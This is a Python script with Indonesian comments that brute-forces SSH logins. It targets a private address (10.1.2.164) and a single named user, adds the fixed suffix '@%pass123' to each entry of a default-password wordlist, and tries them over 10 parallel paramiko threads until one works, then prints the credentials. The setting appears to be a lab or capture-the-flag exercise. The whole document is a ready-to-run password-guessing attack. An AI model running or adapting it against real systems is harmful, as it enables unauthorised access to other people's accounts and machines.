import paramiko
import threading
from queue import Queue

# Konfigurasi target dan wordlist
host = '10.1.2.164'
port = 22  # Fokus ke SSH
username = 'Filipus'
wordlist_path = '/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt'
password_suffix = '@%pass123'
num_threads = 10

# Queue dan event
task_queue = Queue()
found = threading.Event()

# Load wordlist
with open(wordlist_path, 'r', errors='ignore') as f:
    passwords = [line.strip() for line in f if line.strip()]
print(f"[*] Loaded {len(passwords)} passwords.")

# Enqueue password (hanya satu username)
for password in passwords:
    task_queue.put(password)

# Fungsi brute force SSH
def try_ssh(password):
    try:
        full_password = password + password_suffix
        print(f"[-] Trying: {password}{password_suffix}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=full_password, timeout=5)
        print(f"[+] SUCCESS: {username}:{full_password}")
        found.set()
        ssh.close()
    except paramiko.AuthenticationException:
        pass
    except Exception as e:
        print(f"[!] Error on {password}: {e}")

# Worker thread
def worker():
    while not task_queue.empty() and not found.is_set():
        password = task_queue.get()
        try_ssh(password)
        task_queue.task_done()

# Jalankan thread
print(f"[*] Starting {num_threads} threads...")
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Tunggu semua selesai
for t in threads:
    t.join()

print("[*] Brute force selesai.")
